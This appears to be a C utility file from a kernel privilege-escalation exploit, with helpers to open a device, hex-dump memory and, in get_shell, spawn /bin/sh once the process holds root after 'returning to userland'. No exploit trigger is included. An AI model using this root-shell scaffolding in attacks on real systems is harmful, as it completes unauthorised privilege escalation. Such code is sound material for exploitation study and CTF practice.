#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <errno.h>
#include "utils.h"

/* Open file stream for a device/module */
int open_dev(const char *path, int flags) 
{
    int fd = open(path, flags);
    if (fd < 0) {
        FAILURE("Failed to open %s: %s", path, strerror(errno));
        DIE("open_dev");
    }

    SUCCESS("Opened device: %s (fd=%d)", path, fd);
    return fd;
}

/* Print a hex dump of memory */
void hexdump(const char *label, const void *addr, size_t len)
{
    const uint8_t  *bytes  = (const uint8_t *)addr;
    const uint64_t *qwords = (const uint64_t *)addr;
    size_t qword_len = len / 8;

    puts("\n------------------------hexdump------------------------");
    printf("[DEBUG] %s (%zu bytes @ %p):\n\n", label, len, addr);

    // BYTE VIEW
    puts("[BYTE VIEW]");
    for (size_t i = 0; i < len; i += 16) {
        printf("%02zu:%04zx│ ", i / 16, i);
        for (size_t j = 0; j < 16; ++j) {
            if (i + j < len)
                printf("%02x ", bytes[i + j]);
            else
                printf("   ");
        }
        putchar('\n');
    }

    // QWORD VIEW
    puts("\n[QWORD VIEW]");
    for (size_t i = 0; i < qword_len; i += 2) {
        size_t offset = i * 8;
        printf("%02zu:%04zx│  0x%016lx", i / 2, offset, qwords[i]);
        if (i + 1 < qword_len)
            printf("  0x%016lx", qwords[i + 1]);
        putchar('\n');
    }

    // Tail handling
    size_t tail_offset = qword_len * 8;
    size_t tail_len = len - tail_offset;
    if (tail_len > 0) {
        printf("[TAIL %04zx│ ", tail_offset);
        for (size_t i = 0; i < tail_len; ++i)
            printf("%02x ", bytes[tail_offset + i]);
        putchar('\n');
    }

    puts("------------------------hexdump------------------------\n");
}

/* Spawn root shell if uid == 0 */
void get_shell(const char *mode)
{   /* Use get_shell() wrapper to pass function ptr */
    if (!mode || strlen(mode) == 0) {
        FAILURE("No mode specified for shell execution\n");
        _exit(1);
    }

    INFO("Returned to userland");

    if (getuid() != 0) {
        FAILURE("UID: %d — privilege escalation failed\n", getuid());
        DIE("no root");
    }

    if (strcmp(mode, "execve") == 0) {
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
        DIE("execve failed");
    } else if (strcmp(mode, "system") == 0) {
        system("/bin/sh");
        DIE("system() failed");
    } else if (access(mode, X_OK) == 0) {
        char *args[] = {(char *)mode, NULL};
        execve(mode, args, NULL);
        DIE("execve failed");
    } else {
        FAILURE("Invalid mode or path: %s\n", mode);
    }

    _exit(1); // failsafe
}


